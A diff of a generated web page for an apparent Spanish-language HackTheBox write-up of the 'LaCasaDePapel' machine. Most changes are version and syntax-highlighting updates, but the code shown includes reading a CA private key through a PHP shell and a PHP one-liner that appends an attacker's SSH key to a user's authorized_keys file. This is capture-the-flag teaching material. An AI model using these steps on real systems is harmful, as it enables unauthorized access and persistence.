@@ -1257,7 +1257,7 @@
     <meta property="twitter:description" content="LaCasaDePapel con tematica en la serie de Netflix, expone la consola de desarrollo Psy Shell por medio de la cual obtuvimos certificados para acceder a un area restringida. Escribimos nuestra clave publica en los archivos SSH para obtener acceso. Finalmente escalamos privilegios mediante un CronJob.">
   
 
-<meta name="generator" content="Hugo 0.68.3" />
+<meta name="generator" content="Hugo 0.80.0" />
 <meta name="msapplication-TileColor" content="#1d1d1d">
 
 <meta name="theme-color" content="#1d1d1d">
@@ -1594,10 +1594,10 @@
   <li><a href="https://sckull.github.io/tags/ftp/" class="single__tag" title="ftp">ftp</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">cron</a></li>
+  <li><a href="https://sckull.github.io/tags/openssl/" class="single__tag" title="openssl">openssl</a></li>
   
 
-  <li><a href="https://sckull.github.io/tags/openssl/" class="single__tag" title="openssl">openssl</a></li>
+  <li><a href="https://sckull.github.io/tags/cron/" class="single__tag" title="cron">cron</a></li>
   
 
   <li><a href="https://sckull.github.io/tags/psy-shell/" class="single__tag" title="psy shell">psy shell</a></li>
@@ -1799,14 +1799,14 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">class Tokyo {
-	private function sign($caCert,$userCsr) {
-    	$caKey = file_get_contents(&#39;/home/nairobi/ca.key&#39;);
-    	$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, [&#39;digest_alg&#39;=&gt;&#39;sha256&#39;]);
-    	openssl_x509_export($userCert, $userCertOut);
-    	return $userCertOut;
-    }
-}
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Tokyo</span> <span class="p">{</span>
+	<span class="k">private</span> <span class="k">function</span> <span class="nf">sign</span><span class="p">(</span><span class="nv">$caCert</span><span class="p">,</span><span class="nv">$userCsr</span><span class="p">)</span> <span class="p">{</span>
+    	<span class="nv">$caKey</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/home/nairobi/ca.key&#39;</span><span class="p">);</span>
+    	<span class="nv">$userCert</span> <span class="o">=</span> <span class="nx">openssl_csr_sign</span><span class="p">(</span><span class="nv">$userCsr</span><span class="p">,</span> <span class="nv">$caCert</span><span class="p">,</span> <span class="nv">$caKey</span><span class="p">,</span> <span class="mi">365</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;digest_alg&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;sha256&#39;</span><span class="p">]);</span>
+    	<span class="nx">openssl_x509_export</span><span class="p">(</span><span class="nv">$userCert</span><span class="p">,</span> <span class="nv">$userCertOut</span><span class="p">);</span>
+    	<span class="k">return</span> <span class="nv">$userCertOut</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Al parecer es una clase que crea un certificado para tener acceso a la pagina en https, vamos a generar el nuestro utilizando la key (ca.key) que utiliza la funcion. Para leer este archiv utilizamos: <code>file_get_contents(archivo)</code>.</p>
@@ -1857,7 +1857,7 @@ Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span clas
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">$text = &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull&#34;;$filename = &#34;/home/dali/.ssh/authorized_keys&#34;;$fh = fopen($filename, &#34;a&#34;);fwrite($fh, $text);fclose($fh);
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$text</span> <span class="o">=</span> <span class="s2">&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkleT1qRUUh9Qu7dT4UXLIfsQc4qkEvKax/+7T3l24zhIJm3R2KOEbfOYdtRBwVOyoE8YfXp7YjPV/lFa7W5MkOoXACk3bl1rYS8GrRr/uYMabrponpZTFPMRl90lBArarRPMFtEKtrhoTw+QBSdKa8Be5AOCp5I+Ky8hF/Pf7uSgThtYD7/LLFIpW6YJJu06M890xah1TwuXkgqzPfPWtaVOYvS1smnSYbjflNtMQ0pHSHBTElXx9r9VmFXIslBkST1iHbQT5ZzWHvKxFQkAEoLyAqdvIkgJ7zKbcEwz9bQO4dPVe18D4srDGUnoG+v+/YNexvwmHaCP/V5cUdupv root@sckull&#34;</span><span class="p">;</span><span class="nv">$filename</span> <span class="o">=</span> <span class="s2">&#34;/home/dali/.ssh/authorized_keys&#34;</span><span class="p">;</span><span class="nv">$fh</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">);</span><span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fh</span><span class="p">,</span> <span class="nv">$text</span><span class="p">);</span><span class="nx">fclose</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>Escribimos y verificamos.<br />
